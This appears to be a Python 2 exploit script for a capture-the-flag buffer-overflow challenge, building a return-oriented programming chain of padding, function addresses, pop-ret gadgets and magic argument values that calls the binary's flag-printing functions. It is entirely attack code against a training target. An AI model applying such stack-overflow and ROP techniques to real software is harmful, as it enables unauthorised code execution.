import os
import struct
import subprocess


changewall = 0x080486ec
catcat = 0x08048713
catflag = 0x08048764
addtext = 0x080487b5
pop_ret = 0x080484ed
pop_pop_ret = 0x080488ba
print_flag = 0x0804846b

payload = "\x90"*0x70
#payload += "BBBB"
payload += struct.pack("I", changewall)
payload += struct.pack("<I", catcat)
payload += struct.pack("<I", pop_ret)
payload += struct.pack("<I", 0xb100d)

payload += struct.pack("<I", catflag)
payload += struct.pack("<I", pop_ret)
payload += struct.pack("<I", 0xba11)

payload += struct.pack("<I", addtext)
payload += struct.pack("<I", pop_pop_ret)
payload += struct.pack("<I", 0x1555)
payload += struct.pack("<I", 0xc1f101)

payload += struct.pack("<I", print_flag)
print payload
exit()
